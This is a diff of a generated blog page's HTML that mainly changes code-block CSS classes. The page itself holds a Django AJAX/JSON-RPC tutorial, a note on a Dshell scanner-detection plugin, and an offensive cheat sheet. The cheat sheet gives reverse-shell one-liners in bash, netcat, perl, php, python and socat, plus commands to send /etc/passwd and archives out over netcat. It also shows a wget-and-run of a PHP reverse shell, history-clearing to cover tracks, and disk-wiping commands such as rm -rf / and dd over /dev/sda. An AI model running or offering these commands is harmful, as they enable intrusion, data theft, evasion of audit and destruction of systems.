-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fingerprint
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fingerprint
 user_agent
 language
 color_depth
@@ -2063,12 +2331,12 @@ js_fonts
 
 &lt;h3 id=&quot;url-dispatcher&quot;&gt;URL dispatcher&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r'^ajaxjsonrpc/$', views.jsonrpc, name='jsonrpc')
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r'^ajaxjsonrpc/$', views.jsonrpc, name='jsonrpc')
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;viewcontroller&quot;&gt;View/Controller&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@methods.add
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@methods.add
 def ping(request):
     data = request
     # Work with json data received
@@ -2084,9 +2352,9 @@ def jsonrpc(request):
 
 &lt;h3 id=&quot;javascript&quot;&gt;JavaScript&lt;/h3&gt;
 
-&lt;p&gt;Django use Cross Site Request Forgery protection, to avoid the error &lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF verification failed. Request aborted.&lt;/code&gt; it is needed to pass django csrf token with javascript we can use the next code:&lt;/p&gt;
+&lt;p&gt;Django use Cross Site Request Forgery protection, to avoid the error &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CSRF verification failed. Request aborted.&lt;/code&gt; it is needed to pass django csrf token with javascript we can use the next code:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
 
 function getCookie(name) {
     var cookieValue = null;
@@ -2123,7 +2391,7 @@ $.ajaxSetup({
 
 &lt;p&gt;Using json rpc we can send the data via HTTP POST to our url previously created in order to be able to manage by our custom view/controller ping.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
 
 data = { &quot;item&quot;: &quot;one&quot;, &quot;item2&quot;: &quot;two&quot;  }
 
@@ -2145,14 +2413,14 @@ $.jrpc(&quot;http://127.0.0.1:8000/ajaxjsonrpc/&quot;,
 
 &lt;h3 id=&quot;url-dispatcher-1&quot;&gt;URL dispatcher&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r'^ajax/AJAXviewsExample/$', views.AJAXviewsExample, name='AJAXviewsExample')
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r'^ajax/AJAXviewsExample/$', views.AJAXviewsExample, name='AJAXviewsExample')
 url(r'^ajax/AJAXviewsGET/$', views.AJAXviewsGET, name='AJAXviewsGET')
 url(r'^ajax/AJAXviewsPOST/$', views.AJAXviewsPOST, name='AJAXviewsPOST')
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;viewcontroller-1&quot;&gt;View/Controller&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@csrf_protect
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@csrf_protect
 def AJAXviewsExample(request):
   if request.method == 'GET':
        print &quot;DATA&quot; + str(request)
@@ -2184,7 +2452,7 @@ def AJAXviewsPOST(request):
 
 &lt;p&gt;Django use Cross Site Request Forgery protection, to avoid the error ‘CSRF verification failed. Request aborted.’ it is needed to pass django csrf token with javascript we can use the next code:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
   function getCookie(name) {
     var cookieValue = null;
     if (document.cookie &amp;amp;&amp;amp; document.cookie != '') {
@@ -2220,7 +2488,7 @@ $.ajaxSetup({
 
 &lt;p&gt;Using AJAX we can send the data via HTTP GET or POST to our url previously created in order to be manage by our custom views/controllers AJAXviewsGET and AJAXviewsPOST.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
 
 // GET 
 
@@ -2309,7 +2577,7 @@ https://blog.paranoidpenguin.net/2017/04/jorgee-goes-on-a-rampage/&lt;/p&gt;
 
 &lt;p&gt;If the original scanner is not modified, can be detected. This is a PoC in order to generate simple rules to detect and identified some of the most commons Penetration/Exploit/Hijacking Tools. For example an OpenVAS scan:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d peht Openvas.pcap 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d peht Openvas.pcap 
 
 Request Timestamp (UTC): 2017-08-25 13:54:44.594979 
 Penetration/Exploit/Hijacking Tool: Open Vulnerability Assessment System
@@ -2343,9 +2611,9 @@ Destination IP: 192.168.10.23 - Destination port: 80 - MAC: 68:a3:c4:f0:d6:ce
 
 &lt;p&gt;&lt;img src=&quot;https://i.imgur.com/kuUPCFz.png&quot; alt=&quot;OpenVAS&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;To obtain and show a detailed output we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;--peht_showcontent&lt;/code&gt; option:&lt;/p&gt;
+&lt;p&gt;To obtain and show a detailed output we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--peht_showcontent&lt;/code&gt; option:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d peht --peht_showcontent &lt;span class=&quot;nt&quot;&gt;&amp;lt;pcap&amp;gt;&lt;/span&gt; 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d peht --peht_showcontent &amp;lt;pcap&amp;gt; 
 
 Request Timestamp (UTC): 2017-07-16 02:41:47.238549 
 Penetration/Exploit/Hijacking Tool: Arbitrary Remote Code Execution/injection
@@ -2363,13 +2631,13 @@ Response Reason: Found
 Response Status: 302
 Destination IP: 192.168.1.1 - Destination port: 80 - MAC: a4:42:7b:56:b6:23
 
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;302 Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The document has moved &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://example.com/command.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;here&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;302 Found&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Found&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The document has moved &amp;lt;a href=&quot;https://example.com/command.php&quot;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -2389,12 +2657,12 @@ Destination IP: 192.168.1.1 - Destination port: 80 - MAC: a4:42:7b:56:b6:23
 
 &lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Windows: nc.exe 192.168.1.1 4444 -e cmd.exe
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Windows: nc.exe 192.168.1.1 4444 -e cmd.exe
 Linux: nc 192.168.1.1 4444 -e /bin/bash
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -2402,56 +2670,56 @@ Linux: nc 192.168.1.1 4444 -e /bin/bash
 
 &lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.1/4444 0&amp;gt;&amp;amp;1
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.1/4444 0&amp;gt;&amp;amp;1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;192.168.1.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;192.168.1.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php -r '$sock=fsockopen(&quot;192.168.1.1&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php -r '$sock=fsockopen(&quot;192.168.1.1&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.1.1 4444 &amp;gt;/tmp/f
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.1.1 4444 &amp;gt;/tmp/f
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0&amp;lt;&amp;amp;196; exec 196&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0&amp;lt;&amp;amp;196; exec 196&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.1:4444 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.1:4444 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;send-files&quot;&gt;Send files&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec 3&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444 &amp;amp;&amp;amp; cat /etc/passwd&amp;gt;&amp;amp;3
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec 3&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444 &amp;amp;&amp;amp; cat /etc/passwd&amp;gt;&amp;amp;3
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;send-files-through-netcat&quot;&gt;Send Files through Netcat&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 &amp;gt; received_file
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 &amp;gt; received_file
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat 192.168.1.1 4444 &amp;lt; original_file
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat 192.168.1.1 4444 &amp;lt; original_file
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 | tar xzvf -
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 | tar xzvf -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar -czf - * | netcat 192.168.1.1 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar -czf - * | netcat 192.168.1.1 4444
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;file-upload-in-windows-with-powershell&quot;&gt;File upload in Windows with PowerShell&lt;/h3&gt;
@@ -2462,21 +2730,21 @@ Linux: nc 192.168.1.1 4444 -e /bin/bash
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/JohnTroony/php-webshells&quot;&gt;php-webshells&lt;/a&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;amp;&amp;amp; php -f /tmp/php_shell.php
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;amp;&amp;amp; php -f /tmp/php_shell.php
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;covering-the-tracks&quot;&gt;Covering the tracks&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;Avoiding history&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export HISTFILE=
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export HISTFILE=
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unset HISTFILE
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unset HISTFILE
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Clear history&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf .bash_history 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf .bash_history 
 touch .bash_history (invasive)
 history -c
 set +o history
@@ -2484,7 +2752,7 @@ set +o history
 
 &lt;p&gt;&lt;strong&gt;Destroy&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf / 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf / 
 find / -type f -exec {} 
 mkfs.ext3 /dev/sda
 dd if=/dev/zero of=/dev/sda bs=1M
